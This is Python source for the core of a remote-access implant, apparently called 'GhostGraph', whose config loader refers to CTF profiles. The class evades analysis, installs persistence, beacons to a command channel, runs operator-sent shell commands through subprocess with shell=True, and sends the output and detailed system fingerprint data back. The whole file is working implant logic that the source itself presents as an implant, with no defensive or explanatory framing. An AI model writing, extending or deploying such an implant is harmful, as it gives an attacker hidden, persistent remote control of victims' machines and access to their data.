import time
import logging
import signal
import sys
import os
from core.channels import ChannelManager
from core.crypto import AdaptiveCrypto
from core.scheduler import AdaptiveScheduler
from core.persistence import PersistenceManager
from utilities.anti_analysis import AntiAnalysis
from utilities.fingerprint import SystemFingerprint

class BaseImplant:
    def __init__(self, config: dict):
        os.environ.setdefault('CONFIG_PATH', config.get('config_path', 'config/profiles.py'))
        self.config = self._load_config(config)
        self.logger = self._setup_logging()
        self.anti = AntiAnalysis()
        self.fp = SystemFingerprint()
        self.crypto = AdaptiveCrypto(
            self.config['shared_secret'],
            context=self.fp.get_system_id()
        )
        self.scheduler = AdaptiveScheduler(self.config['scheduler'])
        self.persistence = PersistenceManager(self.config['persistence'])
        self.channel_manager = ChannelManager()
        self._setup_channels()
        self._setup_signals()
        
    def _load_config(self, base_config: dict) -> dict:
        # Load from env/profiles
        import importlib.util
        spec = importlib.util.spec_from_file_location("profiles", os.environ['CONFIG_PATH'])
        profiles = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(profiles)
        profile = base_config.get('profile', 'stealth')
        return {**base_config, **profiles.CTF_PROFILES.get(profile, {})}
    
    def _setup_logging(self):
        logging.basicConfig(level=logging.ERROR, format='%(asctime)s - %(message)s')
        return logging.getLogger('GhostGraph')
    
    def _setup_signals(self):
        def handler(sig, frame):
            self.cleanup()
            sys.exit(0)
        signal.signal(signal.SIGINT, handler)
        signal.signal(signal.SIGTERM, handler)
    
    def _setup_channels(self):
        channel_cfg = self.config['channel']
        self.channel = self.channel_manager.create_channel(channel_cfg['type'], channel_cfg, self.crypto)
    
    def run(self):
        if not self.anti.should_continue():
            sys.exit(1)
        self.persistence.install()
        while True:
            if not self.anti.should_continue():
                break
            success = self.channel.beacon()
            if success:
                resp = self.channel.receive_response('')
                if resp and resp.get('type') == 'command':
                    self._execute(resp)
                self.scheduler.record_success()
            else:
                self.scheduler.record_failure()
            self.scheduler.sleep_until_next()
    
    def _execute(self, cmd_data: dict):
        task_id = cmd_data.get('task_id', '')
        cmd = cmd_data.get('command')
        try:
            if cmd == 'shell':
                import subprocess
                result = subprocess.run(cmd_data['args']['cmd'], shell=True, capture_output=True, text=True, timeout=30)
                output = {'stdout': result.stdout, 'stderr': result.stderr}
            elif cmd == 'info':
                output = self.fp.collect_detailed()
            # Add download/upload, etc.
            else:
                output = {'error': 'Unknown cmd'}
            self.channel.send_command({'type': 'result', 'task_id': task_id, 'data': output}, task_id)
            self.scheduler.record_success()
        except Exception as e:
            self.logger.error(f"Exec failed: {e}")
            self.scheduler.record_failure()
    
    def cleanup(self):
        self.persistence.remove()
        self.channel.teardown()
